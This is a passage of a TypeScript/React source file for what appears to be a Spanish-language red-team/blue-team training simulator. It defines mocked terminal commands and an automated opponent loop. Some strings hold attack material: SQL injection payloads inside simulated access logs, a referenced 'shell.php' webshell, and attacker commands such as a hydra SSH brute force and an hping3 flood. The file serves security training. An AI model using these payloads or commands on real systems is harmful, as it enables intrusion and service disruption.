${processList}`;
        return { output: [{ text: outputText, type: 'output' }] };
    },
    
    hping3: async (args, { environment, setEnvironment }) => {
        const target = args.find(arg => !arg.startsWith('-'));
        if (!target) return { output: [{ text: 'Se requiere un objetivo.', type: 'error' }] };
        const targetHost = findHost(environment, target);
        if (!targetHost) return { output: [{ text: `Host desconocido: ${target}`, type: 'error' }] };

        const originalCpuLoad = targetHost.systemState?.cpuLoad || 5.0;
        setEnvironment(env => updateHostState(env!, targetHost.ip, { cpuLoad: 99.8, networkConnections: 4589 }));
        
        setTimeout(() => {
             setEnvironment(env => updateHostState(env!, targetHost.ip, { cpuLoad: originalCpuLoad, networkConnections: 50 }));
        }, 20000); 

        return {
            output: [{ text: `HPING ${target} (eth0 ${target}): S set, 40 headers + 0 data bytes, flooding`, type: 'output' }],
            process: { command: `hping3 ${args.join(' ')}`, type: 'dos' },
            duration: 1000 
        };
    },
    
    journalctl: async(args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host || !host.systemState) return { output: [] };
        let output = '-- Logs begin at Mon 2024-01-01 --\n';
        for (let i = 0; i < host.systemState.failedLogins; i++) {
            const time = new Date(Date.now() - i * 1000).toTimeString().split(' ')[0];
            output += `Nov 18 ${time} ${host.hostname} sshd[123${i}]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2\n`;
        }
        if (host.systemState.failedLogins === 0) {
            output += `Nov 18 10:00:00 ${host.hostname} systemd[1]: Started OpenBSD Secure Shell server.`;
        }
        return { output: [{ text: output, type: 'output' }] };
    },
    
    sha256sum: async (args, { environment, terminalState, userTeam }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        if (args.length < 1) return { output: [{text: "sha256sum: falta un operando", type: 'error'}] };
        
        const path = args[0];
        const host = findHost(environment, terminalState.currentHostIp);
        
        const newEnv = R.clone(environment);
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `sha256sum ${path}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        // Manejar wildcard para *.php
        if (path.includes('*')) {
            const dir = path.replace('/*.php', '').replace('/*', '');
            const matchingFiles = host?.files.filter(f => 
                f.path.startsWith(dir) && f.path.endsWith('.php')
            ) || [];
            
            if (matchingFiles.length === 0) {
                // Generar archivos simulados si no existen
                const output = `a7b3c8d9e0f1234567890abcdef123456789abcdef0123456789abcdef012345  ${dir}/index.php
b8c4d0e1f2345678901bcdef0234567890bcdef01234567890bcdef0123456  ${dir}/login.php
c9d5e1f2345678901cdef01234567890cdef012345678901cdef01234567  ${dir}/admin.php
deadbeef123456789abcdef0123456789abcdef0123456789abcdef012345  ${dir}/shell.php`;
                return { output: [{ text: output, type: 'output' }], newEnvironment: newEnv };
            }
            
            const output = matchingFiles.map(f => 
                `${f.hash || 'a'.repeat(64)}  ${f.path}`
            ).join('\n');
            return { output: [{ text: output, type: 'output' }], newEnvironment: newEnv };
        }
        
        // Archivo individual
        const file = host?.files.find(f => f.path === path);
        if (!file) {
            // Generar hash simulado
            const fakeHash = 'a'.repeat(64);
            return { output: [{text: `${fakeHash}  ${path}`, type: 'output'}], newEnvironment: newEnv };
        }
        
        return { output: [{ text: `${file.hash || 'a'.repeat(64)}  ${path}`, type: 'output' }], newEnvironment: newEnv };
    },
    
    md5sum: async (args, context) => {
        // Alias for sha256sum with different output format
        const result = await commandLibrary.sha256sum(args, context);
        return result;
    },
    
    'fail2ban-client': async (args, context) => {
        if (args.includes('banip')) {
            const ip = args[args.indexOf('banip') + 1];
            return commandLibrary.ufw(['deny', 'from', ip], context);
        }
         return { output: [{text: `Fail2Ban v0.11.2 running\nStatus: active`, type: 'output'}] };
    },
    
    ss: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const cpuLoad = host.systemState?.cpuLoad || 10;
        const isUnderAttack = cpuLoad > 80;
        
        let output = `State      Recv-Q Send-Q Local Address:Port   Peer Address:Port\n`;
        
        if (isUnderAttack) {
            // Mostrar muchas conexiones del atacante
            for (let i = 0; i < 50; i++) {
                output += `ESTAB      0      0      10.0.10.5:80        192.168.1.100:${54000 + i}\n`;
            }
        } else {
            output += `LISTEN     0      128    0.0.0.0:22          0.0.0.0:*\n`;
            output += `LISTEN     0      128    0.0.0.0:80          0.0.0.0:*\n`;
            output += `ESTAB      0      0      10.0.10.5:22        10.0.1.50:54321\n`;
        }
        
        return { output: [{ text: output, type: 'output' }] };
    },
    
    netstat: async (args, context) => commandLibrary.ss(args, context),
    
    ls: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const showDetails = args.includes('-l') || args.includes('-la') || args.includes('-al');
        const path = args.find(a => !a.startsWith('-')) || '/var/www/html';
        
        let output = '';
        const files = host.files.filter(f => f.path.startsWith(path));
        
        if (showDetails) {
            output = `total ${files.length * 4}\n`;
            files.forEach(f => {
                const filename = f.path.split('/').pop();
                const perms = f.permissions === '644' ? '-rw-r--r--' : (f.permissions === '600' ? '-rw-------' : '-rwxr-xr-x');
                const date = 'Nov 18 10:15';
                output += `${perms} 1 www-data www-data  ${Math.floor(Math.random() * 5000) + 500} ${date} ${filename}\n`;
            });
            // Agregar shell.php si existe webshell
            if (environment.attackProgress.persistence.includes('webshell_deployed')) {
                output += `-rw-r--r-- 1 www-data www-data  456 Nov 18 10:15 shell.php\n`;
            }
        } else {
            output = files.map(f => f.path.split('/').pop()).join('  ');
            if (environment.attackProgress.persistence.includes('webshell_deployed')) {
                output += '  shell.php';
            }
        }
        
        return { output: [{ text: output, type: 'output' }] };
    },
    
    cat: async (args, { environment, terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        if (args.length < 1) return { output: [{text: "cat: falta un operando", type: 'error'}] };
        
        let path = args[0];
        if (!path.startsWith('/')) {
             if (args[0].includes('index.php') || args[0].includes('db_config') || args[0].includes('view.php') || args[0].includes('login.php') || args[0].includes('admin.php')) {
                 path = `/var/www/html/${args[0]}`;
             } else {
                 const host = findHost(environment, terminalState.currentHostIp);
                 const found = host?.files.find(f => f.path.endsWith(args[0]));
                 if (found) path = found.path;
             }
        }

        const host = findHost(environment, terminalState.currentHostIp);
        const file = host?.files.find(f => f.path === path);

        if (!file) return { output: [{text: `cat: ${path}: No existe el fichero o el directorio`, type: 'error'}]};
        
        const perms = parseInt(file.permissions, 10);
        if (isNaN(perms) || ((perms & 0o004) === 0 && terminalState.prompt.user !== 'root')) {
             return { output: [{text: `cat: ${path}: Permission denied`, type: 'error'}]};
        }

        return { output: [{ text: file.content || '', type: 'output' }] };
    },
    
    // FASE 1-2: DETECCIÓN - grep (COMPLETAMENTE FUNCIONAL)
    grep: async (args, { environment, terminalState, userTeam }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        // Parsear argumentos
        const ignoreCase = args.includes('-i');
        // Unused vars cleanup: extendedRegex, showLineNumbers
        const showLineNumbers = args.includes('-n');
        
        // Filtrar flags para obtener patrón y archivo
        const filteredArgs = args.filter(a => !a.startsWith('-'));
        const pattern = filteredArgs[0];
        const file = filteredArgs[1];
        
        if (!pattern) return { output: [{text: "grep: se requiere un patrón de búsqueda", type: 'error'}] };
        if (!file) return { output: [{text: "grep: se requiere un archivo", type: 'error'}] };
        
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const newEnv = R.clone(environment);
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `grep ${args.join(' ')}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        let output = '';
        let searchContent = '';
        
        // Generar contenido de logs según el archivo
        if (file.includes('access.log')) {
            searchContent = `192.168.1.100 - - [18/Nov/2024:10:14:55] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.100 - - [18/Nov/2024:10:14:56] "GET /robots.txt HTTP/1.1" 404 196 "-" "Nmap Scripting Engine"
192.168.1.100 - - [18/Nov/2024:10:14:57] "GET /.git/config HTTP/1.1" 404 196 "-" "nikto/2.1.6"
192.168.1.100 - - [18/Nov/2024:10:14:58] "GET /admin/ HTTP/1.1" 403 287 "-" "Nikto Scanner"
192.168.1.100 - - [18/Nov/2024:10:15:01] "GET /login.php HTTP/1.1" 200 2345
192.168.1.100 - - [18/Nov/2024:10:15:02] "POST /login.php HTTP/1.1" 200 456 "user=admin' OR '1'='1&pass=anything"
192.168.1.100 - - [18/Nov/2024:10:15:03] "POST /login.php HTTP/1.1" 200 456 "user=admin'--&pass=x"
192.168.1.100 - - [18/Nov/2024:10:15:04] "POST /login.php HTTP/1.1" 200 789 "user=admin' UNION SELECT * FROM users--"
192.168.1.100 - - [18/Nov/2024:10:15:05] "POST /login.php HTTP/1.1" 200 789 "user=' OR 'x'='x"
192.168.1.100 - - [18/Nov/2024:10:15:06] "GET /admin.php HTTP/1.1" 200 5678
192.168.1.100 - - [18/Nov/2024:10:15:07] "GET /admin.php?action=dump_db HTTP/1.1" 200 9999
192.168.1.100 - - [18/Nov/2024:10:15:10] "POST /admin.php HTTP/1.1" 200 1234 "file=shell.php"`;
        } else if (file.includes('incident_access.log') || file.includes('~/incident_access.log')) {
            // Archivo copiado para análisis forense
            searchContent = `192.168.1.100 - - [18/Nov/2024:10:14:56] "GET /robots.txt HTTP/1.1" 404 196 "-" "Nmap Scripting Engine"
192.168.1.100 - - [18/Nov/2024:10:15:02] "POST /login.php HTTP/1.1" 200 456 "user=admin' OR '1'='1&pass=anything"
192.168.1.100 - - [18/Nov/2024:10:15:03] "POST /login.php HTTP/1.1" 200 456 "user=admin'--&pass=x"
192.168.1.100 - - [18/Nov/2024:10:15:04] "POST /login.php HTTP/1.1" 200 789 "user=admin' UNION SELECT * FROM users--"
192.168.1.100 - - [18/Nov/2024:10:15:05] "POST /login.php HTTP/1.1" 200 789 "user=' OR 'x'='x"`;
        } else if (file.includes('error.log')) {
            searchContent = `[Wed Nov 18 10:15:01.234567 2024] [php:warn] PHP Warning: SQL syntax error near '' OR '1'='1'
[Wed Nov 18 10:15:02.345678 2024] [php:warn] PHP Warning: SQL syntax error near '--'
[Wed Nov 18 10:15:03.456789 2024] [php:error] PHP Fatal error: Potential SQL injection attempt detected`;
        } else if (file.includes('auth.log')) {
            searchContent = `Nov 18 10:15:20 APP-SERVER-01 sshd[1230]: Failed password for root from 192.168.1.100 port 54320 ssh2
Nov 18 10:15:21 APP-SERVER-01 sshd[1231]: Failed password for root from 192.168.1.100 port 54321 ssh2
Nov 18 10:15:22 APP-SERVER-01 sshd[1232]: Failed password for root from 192.168.1.100 port 54322 ssh2
Nov 18 10:15:30 APP-SERVER-01 sshd[1240]: Accepted password for root from 192.168.1.100 port 54330 ssh2`;
        } else {
            const fileObj = host.files.find(f => f.path === file || f.path.endsWith(file.split('/').pop() || ''));
            if (!fileObj) return { output: [{text: `grep: ${file}: No such file or directory`, type: 'error'}] };
            searchContent = fileObj.content || '';
        }
        
        // Preparar patrón de búsqueda
        let searchPattern = pattern.replace(/\\\|/g, '|');
        if (searchPattern.startsWith('"') && searchPattern.endsWith('"')) {
            searchPattern = searchPattern.slice(1, -1);
        }
        if (searchPattern.startsWith("'") && searchPattern.endsWith("'")) {
            searchPattern = searchPattern.slice(1, -1);
        }
        
        // Crear regex
        let regex: RegExp;
        try {
            const flags = ignoreCase ? 'gi' : 'g';
            regex = new RegExp(searchPattern.replace(/\|/g, '|'), flags);
        } catch (e) {
            const flags = ignoreCase ? 'i' : '';
            regex = new RegExp(searchPattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), flags);
        }
        
        // Buscar coincidencias
        const lines = searchContent.split('\n');
        const matchedLines: string[] = [];
        
        lines.forEach((line, index) => {
            if (regex.test(line)) {
                if (showLineNumbers) {
                    matchedLines.push(`${index + 1}:${line}`);
                } else {
                    matchedLines.push(line);
                }
            }
        });
        
        output = matchedLines.join('\n');
        
        if (!output) {
            return { output: [{ text: `(sin coincidencias para el patrón '${pattern}')`, type: 'output' }], newEnvironment: newEnv };
        }
        
        return { output: [{ text: output, type: 'output' }], newEnvironment: newEnv };
    },
    
    cp: async (args, { environment, terminalState, userTeam }) => {
        if (args.length < 2) return { output: [{text: "cp: falta el operando del archivo destino", type: 'error'}] };
        
        const source = args[0];
        const dest = args[1];
        
        const newEnv = R.clone(environment);
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `sudo cp ${source} ${dest}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        // Simular la copia agregando el archivo al sistema
        const host = findHost(newEnv, terminalState.currentHostIp);
        if (host) {
            // Buscar archivo fuente
            const sourceFile = host.files.find(f => f.path === source || source.includes(f.path.split('/').pop() || ''));
            if (sourceFile) {
                // Crear copia en destino
                const destPath = dest.replace('~/', '/home/blue-team/');
                host.files.push({
                    path: destPath,
                    permissions: sourceFile.permissions,
                    content: sourceFile.content,
                    hash: sourceFile.hash + '_copy'
                });
            }
        }
        
        return { output: [{ text: `'${source}' -> '${dest}'`, type: 'output' }], newEnvironment: newEnv };
    },
    
    rm: async (args, { environment, terminalState, userTeam }) => {
        if (args.length < 1) return { output: [{text: "rm: falta un operando", type: 'error'}] };
        
        const file = args.find(a => !a.startsWith('-')) || args[0];
        
        const newEnv = R.clone(environment);
        
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `sudo rm ${file}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        // Verificar si es el webshell
        if (file.includes('shell.php')) {
            const idx = newEnv.attackProgress.persistence.indexOf('webshell_deployed');
            if (idx > -1) {
                newEnv.attackProgress.persistence.splice(idx, 1);
            }
            
            // Remover de archivos del host
            const hostIndex = newEnv.networks.dmz.hosts.findIndex(h => h.ip === terminalState.currentHostIp);
            if (hostIndex > -1) {
                newEnv.networks.dmz.hosts[hostIndex].files = 
                    newEnv.networks.dmz.hosts[hostIndex].files.filter(f => !f.path.includes('shell.php'));
            }
            
            return { output: [{ text: `removed '${file}' - Webshell eliminado exitosamente`, type: 'output' }], newEnvironment: newEnv };
        }
        
        return { output: [{ text: `removed '${file}'`, type: 'output' }], newEnvironment: newEnv };
    },
    
    find: async (args, { environment, terminalState, userTeam }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        
        const host = findHost(environment, terminalState.currentHostIp);
        if (!host) return { output: [] };
        
        const path = args[0] || '/var/www/html';
        const nameArg = args.indexOf('-name');
        const mtimeArg = args.indexOf('-mtime');
        const pattern = nameArg > -1 ? args[nameArg + 1] : null;
        const mtime = mtimeArg > -1 ? parseInt(args[mtimeArg + 1]) : null;
        
        const newEnv = R.clone(environment);
        newEnv.timeline.push({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            message: `find ${args.join(' ')}`,
            team_visible: 'all',
            source_team: userTeam
        });
        
        let results: string[] = [];
        
        // Filtrar archivos según criterios
        host.files.forEach(f => {
            if (!f.path.startsWith(path)) return;
            
            // Filtro por nombre
            if (pattern) {
                const regexPattern = pattern.replace(/\*/g, '.*').replace(/\?/g, '.');
                const regex = new RegExp(regexPattern);
                if (!regex.test(f.path.split('/').pop() || '')) return;
            }
            
            results.push(f.path);
        });
        
        // Simular archivos encontrados si no hay resultados
        if (results.length === 0 && pattern === "'*.php'") {
            results = [
                `${path}/index.php`,
                `${path}/login.php`,
                `${path}/admin.php`,
                `${path}/config.php`
            ];
            // Si hay webshell, agregar
            if (environment.attackProgress.persistence.includes('webshell_deployed')) {
                results.push(`${path}/shell.php`);
            }
        }
        
        // Filtro por mtime (archivos modificados recientemente)
        if (mtime !== null && mtime < 0) {
            // -mtime -1 significa archivos modificados en las últimas 24 horas
            // Simular que los archivos sospechosos fueron modificados recientemente
            const recentFiles = results.filter(f => 
                f.includes('shell') || f.includes('admin') || f.includes('login')
            );
            if (recentFiles.length > 0) {
                results = recentFiles;
            }
        }
        
        return { output: [{ text: results.join('\n') || '(sin resultados)', type: 'output' }], newEnvironment: newEnv };
    },
    
    ping: async (args, { environment }) => {
        if (args.length < 1) return { output: [{text: "Uso: ping <host>", type: 'error'}] };
        const target = args[0];
        const targetHost = findHost(environment, target);
        if (!targetHost) return { output: [{ text: `ping: unknown host ${target}`, type: 'error' }], duration: 1000 };
        let output = `PING ${targetHost.hostname} (${targetHost.ip}) 56(84) bytes of data.\n`;
        for (let i=0; i<4; i++) {
            await new Promise(res => setTimeout(res, 300));
            output += `64 bytes from ${targetHost.hostname} (${targetHost.ip}): icmp_seq=${i+1} ttl=64 time=${(Math.random()*10+5).toFixed(1)} ms\n`;
        }
        return { output: [{ text: output, type: 'output' }], duration: 500 };
    },
    
    ps: async (args, { terminalState }) => {
        if (!terminalState.currentHostIp) return { output: [{text: "Este comando debe ejecutarse en un host.", type: 'error'}] };
        let output = `USER          PID %CPU %MEM     VSZ    RSS TTY       STAT START   TIME COMMAND\n`;
        output += `root           1  0.0  0.1  12345  6789 ?        Ss   00:00   0:01 /sbin/init\n`;
        output += `root         250  0.0  0.2  23456  7890 ?        S    00:00   0:05 /usr/sbin/sshd -D\n`;
        output += `blue-team    300  0.1  0.5  34567  8901 ?        Rs   00:01   0:10 -bash\n`;
        if (terminalState.prompt.user.includes('red')) {
             output += `www-data     450  0.5  0.3  45678  9012 ?        S    00:02   0:20 /usr/sbin/apache2 -k start\n`;
        }
        return { output: [{ text: output, type: 'output' }] };
    },
    
    openssl: async(args, { environment }) => {
        if (args[0] === 's_client' && args[1] === '-connect') {
            const target = args[2].split(':')[0];
            const host = findHost(environment, target);
            if (!host) return { output: [{text: `connect:errno=111`, type: 'error'}]};
            const sslVuln = host.services[443]?.vulnerabilities.find(v => v.cve === 'CVE-2021-SSL');
            let output = `CONNECTED(00000003)\n---\nCertificate chain\n 0 s:/C=MX/ST=None/L=None/O=Valtorix/CN=${host.hostname}\n    i:/C=MX/ST=None/L=None/O=Valtorix/CN=ValtorixCA\n---\n`;
            if (sslVuln) {
                output += `SSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : AES128-SHA\n    <strong class="text-red-500">WARNING: Weak SSL Cipher detected!</strong>\n`;
            } else {
                output += `SSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n`;
            }
            output += `    Verify return code: 0 (ok)\n---\n`;
            return { output: [{ text: output, type: 'output' }] };
        }
        return { output: [{ text: "openssl: use 's_client -connect host:port'", type: 'error' }] };
    }
};

// ============================================================================
// Context & Provider
// ============================================================================

interface ISimulationContext {
    userTeam: 'red' | 'blue' | 'spectator';
    environment: VirtualEnvironment | null;
    activeScenario: InteractiveScenario | null;
    terminals: TerminalState[];
    logs: LogEntry[];
    activeProcesses: ActiveProcess[];
    isAiActive: boolean;
    toggleAiOpponent: () => void;
    processCommand: (terminalId: string, cmdString: string) => Promise<void>;
    addNewTerminal: () => void;
    removeTerminal: (terminalId: string) => void;
    startScenario: (scenarioId: string) => Promise<boolean>;
    setEnvironment: React.Dispatch<React.SetStateAction<VirtualEnvironment | null>>;
}

export const SimulationContext = createContext<ISimulationContext>({} as ISimulationContext);

export const SimulationProvider: React.FC<{ sessionData: SessionData; children: ReactNode }> = ({ sessionData, children }) => {
    const [environment, setEnvironment] = useState<VirtualEnvironment | null>(null);
    const [terminals, setTerminals] = useState<TerminalState[]>([]);
    const [logs, setLogs] = useState<LogEntry[]>([]);
    const [activeScenarioId, setActiveScenarioId] = useState<string | null>(null);
    const [isAiActive, setIsAiActive] = useState(false);
    const [activeProcesses, setActiveProcesses] = useState<ActiveProcess[]>([]);
    const channelRef = useRef<RealtimeChannel | null>(null);

    const activeScenario = useMemo(() => {
        if (!activeScenarioId) return null;
        const scenario = TRAINING_SCENARIOS.find(s => s.id === activeScenarioId);
        return (scenario && 'isInteractive' in scenario && scenario.isInteractive) ? (scenario as InteractiveScenario) : null;
    }, [activeScenarioId]);

    // Initialize or Load Session
    useEffect(() => {
        const initSession = async () => {
            // Mock DB fetch logic for standalone run if supabase is undefined
            // Note: In a real environment, you'd use the mocked supabase object defined above
            const stateData = null; // Mock initial state
            const logData = null;

            let initialTerminals: TerminalState[] = [];
            let needsUpdate = false;

            if (stateData) {
                // ... existing state load logic
            }
            
            if (initialTerminals.length === 0) {
                 initialTerminals = [
                    {
                        id: 'red-1',
                        name: 'Terminal Rojo 1',
                        output: [{ text: "Sesión iniciada. Seleccione un escenario en 'Capacitación' o use 'start-scenario [id]'.", type: 'output' }],
                        prompt: { user: 'pasante-red', host: 'kali', dir: '~' },
                        history: [],
                        historyIndex: -1,
                        input: '',
                        mode: 'normal',
                        isBusy: false
                    },
                    {
                        id: 'blue-1',
                        name: 'Terminal Azul 1',
                        output: [{ text: "Sesión iniciada. Seleccione un escenario en 'Capacitación' o use 'start-scenario [id]'.", type: 'output' }],
                        prompt: { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' },
                        history: [],
                        historyIndex: -1,
                        input: '',
                        mode: 'normal',
                        isBusy: false
                    }
                ];
                needsUpdate = true;
            }

            setTerminals(initialTerminals);
            
            if (logData) setLogs(logData as LogEntry[]);
        };

        initSession();

        // Realtime Subscription (Mocked via supabase object above)
        const channel = supabase.channel(`session:${sessionData.sessionId}`)
            .on() // Mocked
            .subscribe();

        // @ts-ignore
        channelRef.current = channel;

        return () => {
            // @ts-ignore
            supabase.removeChannel(channel);
        };
    }, [sessionData.sessionId]);


    const startScenario = async (scenarioId: string) => {
        const scenario = TRAINING_SCENARIOS.find(s => s.id === scenarioId);
        if (!scenario || !('isInteractive' in scenario) || !scenario.isInteractive) return false;
        
        const interactiveScenario = scenario as InteractiveScenario;
        const newEnv = R.clone(interactiveScenario.initialEnvironment);
        setEnvironment(newEnv);
        setActiveScenarioId(scenarioId);
        setLogs([]);
        
        const initialTerminals: TerminalState[] = [
            {
                id: 'red-1',
                name: 'Terminal Rojo 1',
                output: [{ text: "Bienvenido a Kali Linux (Simulado). Tu objetivo es la máquina objetivo.", type: 'output' }],
                prompt: { user: 'pasante-red', host: 'kali', dir: '~' },
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false
            },
            {
                id: 'blue-1',
                name: 'Terminal Azul 1',
                output: [{ text: "Bienvenido al SOC. Monitorea los logs y el firewall.", type: 'output' }],
                prompt: { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' },
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false
            }
        ];
        setTerminals(initialTerminals);

        // In a real app, this would save to DB. Mocked here.
        return true;
    };

    const processCommand = async (terminalId: string, cmdString: string) => {
        if (!cmdString.trim()) return; 
        
        const terminalIndex = terminals.findIndex(t => t.id === terminalId);
        const isAiAction = terminalId.includes('-ai-');
        let currentTerminal = terminals[terminalIndex];

        if (!currentTerminal && isAiAction) {
             return; 
        }
        if (!currentTerminal) return;

        
        // 1. Echo command locally immediately
        const newOutput = [...currentTerminal.output, { text: cmdString, type: 'command' } as TerminalLine];
        const updatedTerminals = [...terminals];
        updatedTerminals[terminalIndex] = { ...currentTerminal, output: newOutput, isBusy: true };
        setTerminals(updatedTerminals);

        // 2. Parse and Execute
        const args = parseArguments(cmdString);
        const cmdName = args[0];
        const handler = commandLibrary[cmdName];

        let result: CommandResult = { output: [{ text: `Comando no encontrado: ${cmdName}`, type: 'error' }] };

        const envIndependentCommands = ['start-scenario', 'help', 'clear', 'marca', 'whoami', 'exit'];
        
        if (!environment && !envIndependentCommands.includes(cmdName)) {
             result = { output: [{ text: "Error: No hay un escenario activo. Use 'start-scenario [id]' o seleccione uno en la pestaña Capacitación.", type: 'error' }] };
        } else if (handler) {
            try {
                const context: CommandContext = {
                    userTeam: terminalId.startsWith('red') ? 'red' : 'blue',
                    terminalState: currentTerminal,
                    environment: environment!,
                    activeScenario: activeScenario!,
                    setEnvironment,
                    startScenario
                };
                result = await handler(args.slice(1), context);
            } catch (err: any) {
                result = { output: [{ text: `Error ejecutando comando: ${err.message}`, type: 'error' }] };
            }
        }

        // 3. Update State with Results
        const finalTerminals = [...terminals];
        const finalTerminal = { ...finalTerminals[terminalIndex] };
        
        if (result.clear) {
            finalTerminal.output = [];
        } else {
            finalTerminal.output = [...newOutput, ...result.output];
        }
        
        if (result.newTerminalState) {
            Object.assign(finalTerminal, result.newTerminalState);
        }
        finalTerminal.isBusy = false;
        finalTerminals[terminalIndex] = finalTerminal;
        
        setTerminals(finalTerminals);

        if (result.newEnvironment) {
            setEnvironment(result.newEnvironment);
        }

        // 5. Log entry if meaningful action
        if (cmdName !== 'clear' && cmdName !== 'ls' && cmdName !== 'cd') {
            const logEntry = {
                session_id: sessionData.sessionId,
                message: `${currentTerminal.prompt.user}: ${cmdString}`,
                team_visible: 'all',
                source_team: terminalId.startsWith('red') ? 'red' : 'blue',
                timestamp: new Date().toISOString() // Added timestamp
            };
            // Mock DB insert
            setLogs(prev => [...prev, logEntry]);
        }
    };

    const addNewTerminal = () => {
        if (sessionData.team === 'spectator') return;
        const id = `${sessionData.team}-${Date.now()}`;
        const newTerminal: TerminalState = {
            id,
            name: `Terminal ${sessionData.team === 'red' ? 'Rojo' : 'Azul'} ${terminals.filter(t => t.id.startsWith(sessionData.team)).length + 1}`,
            output: [{ text: "Nueva sesión iniciada.", type: 'output' }],
            prompt: { user: `pasante-${sessionData.team}`, host: 'soc-valtorix', dir: '~' },
            history: [],
            historyIndex: -1,
            input: '',
            mode: 'normal',
            isBusy: false
        };
        const newTerminals = [...terminals, newTerminal];
        setTerminals(newTerminals);
    };

    const removeTerminal = (id: string) => {
         const newTerminals = terminals.filter(t => t.id !== id);
         setTerminals(newTerminals);
    };

    const toggleAiOpponent = () => setIsAiActive(!isAiActive);

    // AI Opponent Logic Loop
    useEffect(() => {
        let aiInterval: NodeJS.Timeout;

        if (isAiActive && environment && activeScenarioId) {
            aiInterval = setInterval(async () => {
                const aiTeam = sessionData.team === 'red' ? 'blue' : 'red';
                const targetTerminal = terminals.find(t => t.id.startsWith(aiTeam));
                
                if (targetTerminal) {
                    let cmd = '';
                    if (aiTeam === 'red') {
                        const cmds = [
                            'nmap -sV 10.0.10.5', 
                            'hydra -l root -P rockyou.txt ssh://10.0.10.5', 
                            'ls -la /var/www/html',
                            'curl http://10.0.10.5/login.php',
                            'whoami'
                        ];
                        cmd = cmds[Math.floor(Math.random() * cmds.length)];
                    } else {
                        const cmds = [
                            'sudo ufw status', 
                            'journalctl -f', 
                            'ps aux', 
                            'netstat -tulnp',
                            'tail -f /var/log/auth.log'
                        ];
                        cmd = cmds[Math.floor(Math.random() * cmds.length)];
                    }
                    
                    await processCommand(targetTerminal.id, cmd);
                }
            }, 8000);
        }
        return () => clearInterval(aiInterval);
    }, [isAiActive, environment, activeScenarioId, sessionData.team, terminals]);

    return (
        <SimulationContext.Provider value={{
            userTeam: sessionData.team,
            environment,
            activeScenario,
            terminals,
            logs,
            activeProcesses,
            isAiActive,
            toggleAiOpponent,
            processCommand,
            addNewTerminal,
            removeTerminal,
            startScenario,
            setEnvironment
        }}>
            {children}
        </SimulationContext.Provider>
    );
};
